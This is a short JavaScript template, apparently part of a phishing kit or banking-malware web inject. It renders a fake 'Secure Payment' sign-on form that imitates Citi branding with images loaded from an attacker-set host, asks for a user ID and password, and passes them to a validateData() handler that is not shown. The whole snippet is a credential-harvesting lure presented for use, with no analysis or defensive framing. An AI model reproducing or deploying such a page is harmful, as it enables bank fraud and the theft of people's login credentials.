var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
	* {
		font-family: Arial, Helvetica, sans-serif;
	}

	label {
		display: block;
		margin-top: 25px;
		margin-left: 20px;
	}

	input,
	button {
		width: 95%;
		border-radius: 10px;
		height: 40px;
	}
</style>

<img src="${my_hosting}img/citi.jfif" width="100%">
<label>User ID</label>
<center>
	<input type="text" id="txtUsuario" placeholder="User ID">
</center>
<label>Password</label>
<center>
	<input type="text" id="txtPassword" placeholder="Password">
	<br>
	<br>
	<button onclick="validateData()" id="btnUsuario" style="background-color:#056CAE; color:white;border:none">Sign On</button>
</center>
<img src="${my_hosting}img/citi1.jfif" width="100%">
`